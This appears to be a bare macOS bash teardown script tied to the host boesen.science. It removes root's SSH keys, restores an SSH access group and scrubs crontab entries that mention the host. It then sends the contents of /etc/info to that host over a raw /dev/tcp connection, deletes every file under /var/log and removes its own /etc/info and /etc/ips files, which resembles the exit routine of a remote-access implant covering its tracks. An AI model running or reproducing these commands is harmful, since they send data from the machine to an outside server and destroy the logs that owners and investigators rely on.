#!/bin/bash
host=boesen.science

rm -rf /var/root/.ssh

dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh >/dev/null

grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
mv /tmp/crontab /var/at/tabs/root

printf "EXIT: $(< /etc/info) leaving network." >/dev/tcp/$host/2043
rm -rf /var/log/*
rm -rf /etc/info /etc/ips
